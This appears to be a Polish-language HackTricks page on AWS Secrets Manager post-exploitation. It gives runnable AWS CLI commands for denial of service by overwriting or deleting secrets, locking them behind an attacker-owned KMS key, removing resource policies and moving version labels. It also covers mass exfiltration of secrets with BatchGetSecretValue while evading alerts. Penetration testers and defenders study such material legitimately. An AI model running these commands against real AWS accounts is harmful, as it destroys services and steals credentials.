# AWS - Secrets Manager Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Secrets Manager

Aby uzyskać więcej informacji, sprawdź:

{{#ref}}
../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Odczyt sekretów

Sekrety są informacjami wrażliwymi, [check the privesc page](../aws-privilege-escalation/aws-secrets-manager-privesc.md) aby dowiedzieć się, jak je odczytać.

### DoS Change Secret Value

Zmieniając wartość sekretu, możesz spowodować **DoS wszystkich systemów zależnych od tej wartości.**

> [!WARNING]
> Należy pamiętać, że poprzednie wartości są również przechowywane, więc łatwo jest po prostu wrócić do poprzedniej wartości.
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

Jeśli attacker ma uprawnienie secretsmanager:UpdateSecret, może skonfigurować secret tak, aby używał KMS key należącego do attacker. Ten klucz jest początkowo ustawiony w taki sposób, że każdy może uzyskać do niego dostęp i go używać, więc aktualizacja secret z nowym kluczem jest możliwa. Gdyby klucz nie był dostępny, secret nie mógłby zostać zaktualizowany.

Po zmianie klucza dla secret attacker modyfikuje konfigurację swojego klucza tak, aby tylko on mógł mieć do niego dostęp. W ten sposób w kolejnych wersjach secret będzie szyfrowany nowym kluczem, a ponieważ nie ma do niego dostępu, możliwość odzyskania secret zostanie utracona.

Ważne jest, aby pamiętać, że ta niedostępność wystąpi tylko w późniejszych wersjach, po zmianie zawartości secret, ponieważ bieżąca wersja nadal jest zaszyfrowana oryginalnym KMS key.
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Usuwanie sekretu

Minimalna liczba dni potrzebna do usunięcia sekretu to 7
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
## secretsmanager:RestoreSecret

Możliwe jest przywrócenie sekretu, co umożliwia odzyskanie sekretów zaplanowanych do usunięcia, ponieważ minimalny okres usuwania sekretów wynosi 7 dni, a maksymalny 30 dni. W połączeniu z uprawnieniem secretsmanager:GetSecretValue, pozwala to na odzyskanie ich zawartości.

Aby odzyskać sekret, który jest w trakcie usuwania, możesz użyć następującego polecenia:
```bash
aws secretsmanager restore-secret \
--secret-id <Secret_Name>
```
## secretsmanager:DeleteResourcePolicy

Ta akcja pozwala na usunięcie polityki zasobu, która kontroluje, kto może uzyskać dostęp do sekretu. Może to doprowadzić do DoS, jeśli polityka zasobu była skonfigurowana tak, aby umożliwić dostęp określonej grupie użytkowników.

Aby usunąć politykę zasobu:
```bash
aws secretsmanager delete-resource-policy \
--secret-id <Secret_Name>
```
## secretsmanager:UpdateSecretVersionStage

Stany sekretu służą do zarządzania wersjami sekretu. AWSCURRENT oznacza aktywną wersję używaną przez aplikacje, AWSPREVIOUS przechowuje poprzednią wersję, aby można było przywrócić ją w razie potrzeby, a AWSPENDING jest używany w procesie rotacji do przygotowania i walidacji nowej wersji przed ustaleniem jej jako obecnej.

Aplikacje zawsze odczytują wersję oznaczoną jako AWSCURRENT. Jeśli ktoś przeniesie tę etykietę na niewłaściwą wersję, aplikacje będą używać nieprawidłowych danych uwierzytelniających i mogą zawieść.

AWSPREVIOUS nie jest używane automatycznie. Jednak jeśli AWSCURRENT zostanie usunięte lub błędnie przypisane, może się wydawać, że wszystko nadal działa na poprzedniej wersji.
```bash
aws secretsmanager update-secret-version-stage \
--secret-id <your-secret-name-or-arn> \
--version-stage AWSCURRENT \
--move-to-version-id <target-version-id> \
--remove-from-version-id <previous-version-id>
```
{{#include ../../../banners/hacktricks-training.md}}

### Mass Secret Exfiltration via BatchGetSecretValue (do 20 na wywołanie)

Wykorzystaj API Secrets Manager BatchGetSecretValue, aby pobrać do 20 sekretów w jednym żądaniu. To może znacząco zmniejszyć liczbę wywołań API w porównaniu z iterowaniem GetSecretValue dla każdego sekretu. Jeśli używane są filtry (tags/name), wymagane jest również uprawnienie ListSecrets. CloudTrail nadal rejestruje jedno zdarzenie GetSecretValue dla każdego sekretu pobranego w partii.

Wymagane uprawnienia
- secretsmanager:BatchGetSecretValue
- secretsmanager:GetSecretValue dla każdego docelowego sekretu
- secretsmanager:ListSecrets jeśli używasz --filters
- kms:Decrypt na CMKach używanych przez sekrety (jeśli nie używasz aws/secretsmanager)

> [!WARNING]
> Zwróć uwagę, że uprawnienie `secretsmanager:BatchGetSecretValue` samo w sobie nie wystarcza do pobrania sekretów — potrzebujesz także `secretsmanager:GetSecretValue` dla każdego sekretu, który chcesz pobrać.

Exfiltrate by explicit list
```bash
aws secretsmanager batch-get-secret-value \
--secret-id-list <secret1> <secret2> <secret3> \
--query 'SecretValues[].{Name:Name,Version:VersionId,Val:SecretString}'
```
Exfiltrate przez filtry (tag key/value lub name prefix)
```bash
# By tag key
aws secretsmanager batch-get-secret-value \
--filters Key=tag-key,Values=env \
--max-results 20 \
--query 'SecretValues[].{Name:Name,Val:SecretString}'

# By tag value
aws secretsmanager batch-get-secret-value \
--filters Key=tag-value,Values=prod \
--max-results 20

# By name prefix
aws secretsmanager batch-get-secret-value \
--filters Key=name,Values=MyApp
```
Obsługa częściowych awarii
```bash
# Inspect the Errors list for AccessDenied/NotFound and retry/adjust filters
aws secretsmanager batch-get-secret-value --secret-id-list <id1> <id2> <id3>
```
Wpływ
- Szybki “smash-and-grab” wielu sekretów przy mniejszej liczbie wywołań API, potencjalnie omijający alerty dostrojone do skoków GetSecretValue.
- Logi CloudTrail nadal zawierają jedno zdarzenie GetSecretValue na każdy sekret pobrany w tej partii.
